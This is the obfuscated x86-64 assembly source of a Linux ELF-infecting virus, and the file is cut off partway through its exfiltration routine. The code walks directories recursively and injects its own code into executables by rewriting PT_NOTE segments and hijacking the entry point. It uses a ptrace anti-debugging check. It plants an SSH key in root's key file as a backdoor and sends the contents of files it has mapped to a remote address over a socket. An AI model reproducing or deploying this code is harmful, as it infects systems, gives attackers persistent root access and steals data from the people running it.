%include "srcs/obf_file.inc"
; %include "asm/srcs/pestilence.inc"
bits 64 
default rel
section .text
global _start
_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
call rUgiC
; call mEmgTrTNBf
call CP7bRD54C
test rax, rax
js I8v9x3t8
push rax
push 0
call ILtyMiUbi2
add rsp, 8
mov rdx, rax
pop rax
push rax
push HbeFqCY
call WmPZw
add rsp, 8
mov rsi, rax
pop rax
; dir to open for arg initDir
lea rdi, [rel UQKaP2Et] 
; rdi -> to _encrypt 
push rax
zJFzJpMW:
call NHmPl
push rax
push rax
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
pop rax
call kw9tYdParx
push rax
push 0
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
push rax
push WCTxRh2O
call vQ68qNFE
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel p8LLiw]
; mov rdi, p8LLiw ; dir to open for arg initDir
; rdi -> to _encrypt 
push rax
axlbY0U:
call NHmPl
push rax
push rax
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
pop rax
call kw9tYdParx
call gM3lmvq
; jmp zUtPd5W9X
I8v9x3t8:
POPA 
mov rsp, rbp
pop rbp
MXY4Gz:
jmp zUtPd5W9X
mEmgTrTNBf:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
push r14
call EqhHKjPv8
add rsp, 8
movzx r14, byte [r15 + 107]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 211]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 315]
or rax, r14 
pop r14
pop r15
syscall
push rax
push rax
push rax
call WmPZw
add rsp, 8
mov rsi, rax
pop rax
push SYS_PTRACE
call vQ68qNFE
add rsp, 8
push rax
push PTRACE_TRACEME
call EqhHKjPv8
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call WmPZw
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 316]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call ILtyMiUbi2
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 313]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl zUtPd5W9X
pop rax
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov rsi, rax
pop rax
push SYS_PTRACE
call vQ68qNFE
add rsp, 8
push rax
push PTRACE_DETACH
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call WmPZw
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 316]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call WmPZw
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 313]
or r10, r14 
pop r14
pop r15
syscall
ret
; take directory to open in rdi-> jtDI7
kw9tYdParx:
; placing CCMt4EkIm1 on the stack
push rbp
mov rbp, rsp
sub rsp, CCMt4EkIm1_size
lea r8, FAM(CCMt4EkIm1.L1RvGtLrvV)
or qword [r8], -1
lea rsi, FAM(CCMt4EkIm1.jtDI7)
; strcpy(CCMt4EkIm1.jtDI7(rsi), jtDI7(rdi))
call wOENZptTF6 
cmp rdx, 0 
je tkf2Y
; strlen(CCMt4EkIm1.jtDI7(rsi))
call sxeGem 
push rax
push rsi
push rax
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
cmp BYTE [rsi - 1], '/' 
je d4BIZ
mov BYTE [rsi], '/' 
push rax
push rsi
push 1
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
d4BIZ:
push rax
push rdx
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
call wOENZptTF6
mov rdi, rsp
tkf2Y:
push SYS_OPEN
call EqhHKjPv8
add rsp, 8
push rax
push O_RDONLY | O_DIRECTORY
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
cmp rax, 0 
jl WxVNLiTc
; en registre le L1RvGtLrvV dans la struct
lea rdi, FAM(CCMt4EkIm1.L1RvGtLrvV) 
push rax
push rax
call ILtyMiUbi2
add rsp, 8
mov [rdi], rax
pop rax
zvc7ei3n0:
lea r10, FAM(CCMt4EkIm1.L1RvGtLrvV) 
; init S3hVnI
lea r9, FAM(CCMt4EkIm1.S3hVnI) 
mov DWORD [r9], 0 
push SYS_GETDENTS
call WmPZw
add rsp, 8
push rax
push qword [r10]
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
lea rsi, FAM(CCMt4EkIm1.YQubpH)
push rax
push PAGE_SIZE
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
syscall
cmp rax, 0 
jle WxVNLiTc
; r10 -> (struct CCMt4EkIm1.diretents_struct_ptr)
lea r10, FAM(CCMt4EkIm1.XHrxa) 
; CCMt4EkIm1.XHrxa -> CCMt4EkIm1.YQubpH
push rax
push rsi
call WmPZw
add rsp, 8
mov [r10], rax
pop rax
; r11 -> (struct CCMt4EkIm1.K2Ec63tYFT)
lea r11, FAM(CCMt4EkIm1.K2Ec63tYFT) 
mov DWORD [r11], eax 
aUpKMzDtn:
; r8 -> total lu de getdents
lea r8, FAM(CCMt4EkIm1.S3hVnI) 
; r9 -> total a lire de getdents
lea r9, FAM(CCMt4EkIm1.K2Ec63tYFT) 
; r10 -> actual dirent struct
mov r10, FAM(CCMt4EkIm1.XHrxa) 
; r11 -> ptr de la struct actuelle
lea r11, FAM(CCMt4EkIm1.XHrxa) 
movzx r12, WORD [r10 + D_RECLEN_OFF] 
; update du total lu dans r8
add [r8], r12d 
; CCMt4EkIm1.diretns_struct_ptr -> sur la prochaine struct
add qword [r11], r12 
cmp BYTE [r10 + D_TYPE], D_FOLDER 
je ozwAui7R
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
jne YGD54Tx
kvKqo:
; strlen
mov rsi, rsp
call sxeGem
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
push rax
push 1
call wp8jCVLjoB
add rsp, 8
add rsp, 8
sub rsi, rax
mov rdi, rsp
call lbUxk
call ZMGL9iP36y
jmp YGD54Tx
ozwAui7R:
lea rdi, FAM(CCMt4EkIm1.jtDI7)
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne wpWzow6It
cmp BYTE [rdx + 1], 0 
je YGD54Tx
cmp BYTE [rdx + 1], 0x2e 
jne wpWzow6It
cmp BYTE [rdx + 2], 0 
je YGD54Tx
wpWzow6It:
call kw9tYdParx
YGD54Tx:
mov r8, FAM(CCMt4EkIm1.S3hVnI)
mov r12, FAM(CCMt4EkIm1.K2Ec63tYFT)
; if (total lu >= total getdents)
cmp r8d, r12d 
jge zvc7ei3n0
jmp aUpKMzDtn
WxVNLiTc:
mov rdi, FAM(CCMt4EkIm1.L1RvGtLrvV)
cmp qword rdi, 0 
jle vtEQtVpK
push SYS_CLOSE
call vQ68qNFE
add rsp, 8
syscall
or qword FAM(CCMt4EkIm1.L1RvGtLrvV), -1
jmp vtEQtVpK
vtEQtVpK:
leave
JHobF:
ret
ZMGL9iP36y:
push rbp
mov rbp, rsp
sub rsp, H3YySA_size
lea rax, INF(H3YySA.G7Gm7SdHI)
mov qword [rax], 0 
lea rax, INF(H3YySA.oZqfGQqr4)
mov byte [rax], 0 
lea rax, INF(H3YySA.VDkZh1d)
mov qword [rax], 0 
OyGoepfrFt:
push SYS_OPEN
call ILtyMiUbi2
add rsp, 8
push rax
push rsi
call EqhHKjPv8
add rsp, 8
mov rdi, rax
pop rax
push rax
push O_RDWR
call WmPZw
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
cmp rax, 0x0 
jl vtEQtVpK
push rax
push rax
call vQ68qNFE
add rsp, 8
mov INF(H3YySA.JaSrTu), rax
pop rax
; === get file size ===
M7pFMK9ki:
push SYS_LSEEK
call EqhHKjPv8
add rsp, 8
mov rdi, INF(H3YySA.JaSrTu)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 313]
or rsi, r14 
pop r14
pop r15
push rax
push SEEK_END
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
syscall
cmp rax, 0x0 
jle Aa2ibij
push rax
push rax
call vQ68qNFE
add rsp, 8
mov INF(H3YySA.IKSulmT), rax
pop rax
push rax
push rax
call ILtyMiUbi2
add rsp, 8
mov INF(H3YySA.MH3cbV496P), rax
pop rax
UjAoG:
; rax -> map
; rsi = file_size
push rax
push rax
call WmPZw
add rsp, 8
mov rsi, rax
pop rax
push SYS_MMAP
call EqhHKjPv8
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call WmPZw
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
push rax
push PROT_READ | PROT_WRITE | PROT_EXEC
call vQ68qNFE
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_SHARED
call ILtyMiUbi2
add rsp, 8
mov r10, rax
pop rax
mov r8, INF(H3YySA.JaSrTu)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call ILtyMiUbi2
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 313]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl Aa2ibij
call DoSqao0
push r12
call vQ68qNFE
add rsp, 8
push rax
push r15
call EqhHKjPv8
add rsp, 8
mov rsi, rax
pop rax
lea r8, INF(H3YySA.hgLGl4n)
push rax
push rax
call WmPZw
add rsp, 8
mov [r8], rax
pop rax
e6qTIv:
cmp dword [rax + 1], 0x02464c45 
jne vKOBQbe
v90GIQt:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov r15, rax
pop rax
push rax
push r15
call ILtyMiUbi2
add rsp, 8
mov r14, rax
pop rax
push rax
push r14
push qword [r14 + Pa6b23jk8.jjZMUTUH]
call wp8jCVLjoB
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
aiqOe:
cmp cx, [r15 + Pa6b23jk8.tymWfKNVxF]
jge hQen9nK1Hp 
push rax
push r14
push bNVSGbM_size
call wp8jCVLjoB
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp aiqOe
hQen9nK1Hp:
push rax
push r14
call WmPZw
add rsp, 8
mov INF(H3YySA.i7wP7Ff6f), rax
pop rax
xor r9, r9
DvEhuM4q7y:
cmp cx, 0 
jle H9yr8
iJsTBxr:
bt word [r14], 0 
jnc duu4rhYR
bt qword [r14], 0x20 
jc RjbyL3Hz
duu4rhYR:
dec rcx
sub r14, bNVSGbM_size
jmp DvEhuM4q7y
H9yr8:
mov r9, INF(H3YySA.G7Gm7SdHI)
cmp r9, 0 
je vKOBQbe
cmp byte INF(H3YySA.oZqfGQqr4), 1 
je gEHc2W
; else jmp mJrjrYQda0
jmp mJrjrYQda0 
RjbyL3Hz:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
i85lUjOjoR:
; r8 -> potential ztwRvxi
; r9 == ztwRvxi variable
push rax
push r15
call vQ68qNFE
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + bNVSGbM.SjRza15]
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + bNVSGbM.dWs1Yt]
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
sub r8, wrLSNWoXBn
push rax
push qword [rel ztwRvxi]
call ILtyMiUbi2
add rsp, 8
mov r9, rax
pop rax
xBxE3cqkn:
cmp qword r9, [r8]
je vKOBQbe
ouaDwK:
mov r9, INF(H3YySA.G7Gm7SdHI)
test r9, r9
jz xXFbAh6P
mov r9, INF(H3YySA.oZqfGQqr4)
test r9, r9
jz duu4rhYR
xXFbAh6P:
; r8 == end of H3YySA offset
; r9 == next segment offset
push rax
push qword [r14 + bNVSGbM.SjRza15]
call WmPZw
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + bNVSGbM.dWs1Yt]
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
; save segment end's offset
push rax
push r8
call vQ68qNFE
add rsp, 8
mov r13, rax
pop rax
push rax
push r8
push CODE_LEN
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r14
call EqhHKjPv8
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push bNVSGbM_size
call wp8jCVLjoB
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
push bNVSGbM.SjRza15
call wp8jCVLjoB
add rsp, 8
pop r9
mov r9, rax
pop rax
cmp [r9], r8
; if ([r9] < r8) { H3YySA.oZqfGQqr4 = 1) }
setb INF(H3YySA.oZqfGQqr4) 
gFGM9:
; r8 -> H3YySA structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (xXFbAh6P)
;*r14 -> segment header in header table
lea r8, INF(H3YySA.nlOrNvtD)
mov [r8], cl
lea r8, INF(H3YySA.mqXShT6)
push rax
push qword [r15 + Pa6b23jk8.Psnrw]
call vQ68qNFE
add rsp, 8
mov r12, rax
pop rax
push rax
push r12
call ILtyMiUbi2
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(H3YySA.G7Gm7SdHI)
push rax
push r13
call EqhHKjPv8
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(H3YySA.kHV3h3G)
push r9
push rax
push qword [r14 + bNVSGbM.Hk6z5mo]
call WmPZw
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push qword [r14 + bNVSGbM.wi1vl]
call wp8jCVLjoB
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
call ILtyMiUbi2
add rsp, 8
mov [r8], rax
pop rax
pop r9
lea r8, INF(H3YySA.EABdv)
push rax
push r14
call vQ68qNFE
add rsp, 8
mov [r8], rax
pop rax
jmp duu4rhYR
gEHc2W:
tJ1L9h:
push SYS_FTRUNCATE
call WmPZw
add rsp, 8
mov rdi, INF(H3YySA.JaSrTu)
lea rsi, INF(H3YySA.IKSulmT)
push qword [rsi]
add qword [rsi], PAGE_SIZE 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
push rax
push qword [rsi]
call EqhHKjPv8
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rsi
cmp rax, 0 
jl vKOBQbe
iBRiFtq:
mov rdi, INF(H3YySA.hgLGl4n)
push SYS_UNMAP
call EqhHKjPv8
add rsp, 8
syscall
uNqL2vT:
push SYS_MMAP
call WmPZw
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
; rsi = file_size
mov rsi, INF(H3YySA.IKSulmT) 
push rax
push PROT_READ | PROT_WRITE | PROT_EXEC
call ILtyMiUbi2
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_SHARED
call vQ68qNFE
add rsp, 8
mov r10, rax
pop rax
mov r8, INF(H3YySA.JaSrTu)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call ILtyMiUbi2
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 313]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl Aa2ibij
lea r8, INF(H3YySA.hgLGl4n)
push rax
push rax
call WmPZw
add rsp, 8
mov [r8], rax
pop rax
KKB4DrD:
mov r14, INF(H3YySA.hgLGl4n)
movzx rax, word [r14 + Pa6b23jk8.IuDcKlX]
push rax
push r14
push qword [r14 + Pa6b23jk8.YBASwk]
call wp8jCVLjoB
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
Chv22Ll3yo:
cmp rcx, rax
jge G42E7IhP
push rax
push qword [r14 + TKRRcH5Nn.ikNFPT9]
call EqhHKjPv8
add rsp, 8
mov rbx, rax
pop rax
push rax
push rbx
push qword [r14 + TKRRcH5Nn.hAm4v0]
call wp8jCVLjoB
add rsp, 8
pop rbx
mov rbx, rax
pop rax
cmp INF(H3YySA.VDkZh1d), rbx
jge Fci8PJ
push rax
push rbx
call vQ68qNFE
add rsp, 8
mov INF(H3YySA.VDkZh1d), rax
pop rax
Fci8PJ:
push rax
push r14
push TKRRcH5Nn_size
call wp8jCVLjoB
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp Chv22Ll3yo
G42E7IhP:
gmf3kLyxK:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(H3YySA.hgLGl4n)
movzx rax, word [r14 + Pa6b23jk8.tymWfKNVxF]
push rax
push r14
push qword [r14 + Pa6b23jk8.jjZMUTUH]
call wp8jCVLjoB
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
XKhvLW:
cmp rcx, rax
jge Yxe5L0
cmp dword [r14 + bNVSGbM.gAWJeS4], PT_NOTE 
je pvuvq
wCdhb:
push rax
push r14
push bNVSGbM_size
call wp8jCVLjoB
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp XKhvLW
Yxe5L0:
push rax
push -1
call EqhHKjPv8
add rsp, 8
mov r14, rax
pop rax
pvuvq:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl YYZFYSF2V
mov dword [r14 + bNVSGbM.gAWJeS4], PT_LOAD 
mov qword [r14 + bNVSGbM.ihfYIw], PF_X | PF_R 
mov qword [r14 + bNVSGbM.dWs1Yt], CODE_LEN 
mov qword [r14 + bNVSGbM.wi1vl], CODE_LEN 
mov qword [r14 + bNVSGbM.GRVoiT6bNN], PAGE_SIZE 
mov rax, INF(H3YySA.MH3cbV496P)
push rax
push PAGE_SIZE
call wp8jCVLjoB
add rsp, 8
add rsp, 8
and rax, -4096
mov qword [r14 + bNVSGbM.SjRza15], rax
mov qword INF(H3YySA.G7Gm7SdHI), rax
mov rax, INF(H3YySA.VDkZh1d)
push rax
push PAGE_SIZE
call wp8jCVLjoB
add rsp, 8
add rsp, 8
and rax, -4096
mov qword INF(H3YySA.kHV3h3G), rax
mov qword [r14 + bNVSGbM.Hk6z5mo], rax
mov qword [r14 + bNVSGbM.VbReC2K], rax
mJrjrYQda0:
Se71SFf4C:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(H3YySA.hgLGl4n)
push rax
push r8
push Pa6b23jk8.Psnrw
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
mov r10, INF(H3YySA.kHV3h3G)
push rax
push r10
call WmPZw
add rsp, 8
mov [r8], rax
pop rax
cmp byte INF(H3YySA.oZqfGQqr4), 0 
jg ycP8ECje0
push rax
push CODE_LEN
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
call IIGq2Bw2eN
ycP8ECje0:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (ghCNAWt07 - _start)
mov rdi, INF(H3YySA.hgLGl4n)
add rdi, INF(H3YySA.G7Gm7SdHI)
; rsi -> start of our code
lea rsi, [rel _start] 
push rax
push CODE_LEN
call ILtyMiUbi2
add rsp, 8
mov rcx, rax
pop rax
; copy from _start to ghCNAWt07 (= !std)
cld 
rep movsb
YYZFYSF2V:
; r8 -> MXY4Gz instruction's addr (MXY4Gz + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(H3YySA.hgLGl4n)
add r8, INF(H3YySA.G7Gm7SdHI)
push rax
push r8
push FINJMP_OFF
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
inc r8
mov r10, INF(H3YySA.kHV3h3G)
push rax
push r10
push FINJMP_OFF
call wp8jCVLjoB
add rsp, 8
pop r10
mov r10, rax
pop rax
push rax
push r10
push 0x05
call wp8jCVLjoB
add rsp, 8
pop r10
mov r10, rax
pop rax
mov r9, INF(H3YySA.mqXShT6)
sub r9, r10
mov [r8], r9d
jmp vKOBQbe
IIGq2Bw2eN:
; r8 -> segment header data
;*r14 -> segment header in header table
mov r8, INF(H3YySA.EABdv)
; save header start for later
push r8 
; * Update file size *
push rax
push r8
push qword bNVSGbM.dWs1Yt
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
pop r8
; * Update memory size *
push rax
push r8
push bNVSGbM.wi1vl
call wp8jCVLjoB
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
ret
; --- privesc + backdoor
gM3lmvq:
; open "/root/.ssh/authorized.key"
; r9 == L1RvGtLrvV
push rbp
mov rbp, rsp
sub rsp, 0x1000 
push SYS_OPEN
call EqhHKjPv8
add rsp, 8
; mov rdi, gFbtuc
lea rdi, [rel gFbtuc]
push rax
push rsi
push rax
push XeJGp5Zjey
call vQ68qNFE
add rsp, 8
mov rsi, rax
pop rax
nqzaH:
call NHmPl
push rax
push rax
call WmPZw
add rsp, 8
mov rdi, rax
pop rax
pop rsi
pop rax
push rax
push O_RDWR | O_CREAT
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
push rax
push 600
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js vtEQtVpK
push rax
push rax
call vQ68qNFE
add rsp, 8
mov r9, rax
pop rax
kbfJq:
; *r9 == L1RvGtLrvV
; r10 == size read
; rsi -> buffer
push SYS_READ
call WmPZw
add rsp, 8
push rax
push r9
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
mov rsi, rbp
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
push rax
push r14
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 145]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 353]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je ZwzY6fglI
jl Ftpkh
push rax
push rax
call ILtyMiUbi2
add rsp, 8
mov r10, rax
pop rax
dsZhbp8x:
; rcx == nombre d'octet lue
; r11 -> buffer
push rax
push r10
call WmPZw
add rsp, 8
mov rcx, rax
pop rax
push rax
push rsi
call EqhHKjPv8
add rsp, 8
mov r11, rax
pop rax
; for every new line
dNtaHmMj:
cmp byte [r11], 0xa 
je VQvT6ass7
inc r11
loop dNtaHmMj
push SYS_WRITE
call WmPZw
add rsp, 8
; mov rsi, Fq1eHgJTXB
lea rsi, [Fq1eHgJTXB]
push rax
push 1
call vQ68qNFE
add rsp, 8
mov rdx, rax
pop rax
syscall
jmp ZwzY6fglI
; cmp the line with pub ssh oI9lH
VQvT6ass7:
mov byte [r11], 0 
push rax
push r11
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
sub rdi, Z8M8JG1JeJ - 1 
lea rsi, [rel X7VTHDoiTD]
push rax
push rdi
lea rdi, [rel X7VTHDoiTD]
push rax
push Z8M8JG1JeJ
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
xL07Y4tbmY:
call NHmPl
push rax
push rax
call vQ68qNFE
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rcx
call DzETG2
pop rcx
test rax, rax 
je Ftpkh
inc r11
dec rcx
jnz dNtaHmMj
; loop dNtaHmMj
; if not found write it
ZwzY6fglI:
push rax
push r9
call EqhHKjPv8
add rsp, 8
mov rdi, rax
pop rax
push SYS_WRITE
call WmPZw
add rsp, 8
; lea rsi, [rel X7VTHDoiTD]
push rax
push rdi
lea rdi, [rel X7VTHDoiTD]
push rax
push Z8M8JG1JeJ
call vQ68qNFE
add rsp, 8
mov rsi, rax
pop rax
DiLxLsrc4v:
call NHmPl
push rax
push rax
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push Z8M8JG1JeJ
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
syscall
push SYS_WRITE
call WmPZw
add rsp, 8
lea rsi, [rel Fq1eHgJTXB]
push rax
push 1
call WmPZw
add rsp, 8
mov rdx, rax
pop rax
syscall
Ftpkh:
push SYS_CLOSE
call ILtyMiUbi2
add rsp, 8
push rax
push r9
call EqhHKjPv8
add rsp, 8
mov rdi, rax
pop rax
syscall
jmp vtEQtVpK
SUop5H2Q:
h8Qi6:
push SYS_SOCKET
call vQ68qNFE
add rsp, 8
push rax
push AF_INET
call WmPZw
add rsp, 8
mov rdi, rax
pop rax
push rax
push SOCK_STREAM
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
test rax, rax
js JHobF
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov rdi, rax
pop rax
dZpJQ:
push SYS_CONNECT
call vQ68qNFE
add rsp, 8
lea rsi, [rel iWOKqz]
push rax
push 16
call EqhHKjPv8
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js tyBXFZWQ
push rdi
call WmPZw
add rsp, 8
ret
XrnW8w:
push SYS_UNMAP
call vQ68qNFE
add rsp, 8
push rax
push rsi
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
push rax
push rdx
call vQ68qNFE
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rdi
; (rdi: socket)
tyBXFZWQ:
push SYS_CLOSE
call ILtyMiUbi2
add rsp, 8
syscall
push -1
call EqhHKjPv8
add rsp, 8
ret
; extrait les donnees des fichiers via http
DoSqao0:
; r12 -> maped file_date
push rax
push rax
call WmPZw
add rsp, 8
mov r12, rax
pop rax
push rsi
call h8Qi6
pop rsi
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov r13, rax
pop rax
NnrcNqQzJ:
cmp r13, 0 
jl JHobF
jUzIb:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
push SYS_MMAP
call WmPZw
add rsp, 8
xor rdi, rdi
push rsi
push rax
push rsi
push H5gnb8bLe
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push h9RFMA9tjM
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push 10
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
call ILtyMiUbi2
add rsp, 8
mov r15, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call vQ68qNFE
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_PRIVATE | MAP_ANONYMOUS
call WmPZw
add rsp, 8
mov r10, rax
pop rax
xor r8, r8
xor r9, r9
syscall
bUvoOq:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
push rax
push rax
call vQ68qNFE
add rsp, 8
mov r14, rax
pop rax
push rax
push rax
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel L5XcO]
push rax
push rsi
push rax
push H5gnb8bLe
call EqhHKjPv8
add rsp, 8
mov rsi, rax
pop rax
axRBs3Iu0T:
call NHmPl
push rax
push rax
call EqhHKjPv8
add rsp, 8
mov rdi, rax
pop rax
pop rsi
pop rax
call wOENZptTF6
pop rax
push rax
push rax
push rsi
push H5gnb8bLe - 1
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
call XKffqQW
lea rdi, [rel E36kXu]
call wOENZptTF6
push rax
push rsi
push h9RFMA9tjM - 1
call wp8jCVLjoB
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push r12
call vQ68qNFE
add rsp, 8
mov rdi, rax
pop rax
pop rcx
call BxwtR
eXgsQXbUjt:
push SYS_SENDTO
call WmPZw
add rsp, 8
push rax
push r13
call ILtyMiUbi2
add rsp, 8
mov rdi, rax
pop rax
push rax
push r14
call ILtyMiUbi2
add rsp, 8
mov rsi, rax
pop rax
push rax
